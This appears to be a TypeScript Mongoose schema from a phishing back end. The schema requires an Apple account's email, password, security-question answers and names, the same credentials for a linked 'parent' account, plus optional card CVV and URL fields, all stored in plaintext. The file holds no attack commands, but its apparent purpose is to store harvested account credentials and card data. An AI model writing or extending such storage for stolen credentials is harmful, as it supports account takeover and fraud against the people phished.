import { Model, Schema, model, models } from "mongoose";
import { AppleAccountWithParentProps } from "../type";

const UnknownSchema = new Schema({
  email: {
    type: String,
    required: true,
  },
  password: {
    type: String,
    required: true,
  },
  date: {
    type: String,
    required: true,
  },
  first_q: {
    type: String,
    required: true,
  },
  second_q: {
    type: String,
    required: true,
  },
  third_q: {
    type: String,
    required: true,
  },
  first_name: {
    type: String,
    required: true,
  },
  last_name: {
    type: String,
    required: true,
  },
  parent_email: {
    type: String,
    required: true,
  },
  parent_password: {
    type: String,
    required: true,
  },
  parent_date: {
    type: String,
    required: true,
  },
  parent_first_q: {
    type: String,
    required: true,
  },
  parent_second_q: {
    type: String,
    required: true,
  },
  parent_third_q: {
    type: String,
    required: true,
  },
  cvv: String,
  url: String,
  createdAt: {
    type: Date,
    default: () => Date.now(),
  },
});

const Unknown: Model<AppleAccountWithParentProps> =
  models?.Unknown ||
  model<AppleAccountWithParentProps>("Unknown", UnknownSchema);

export default Unknown;
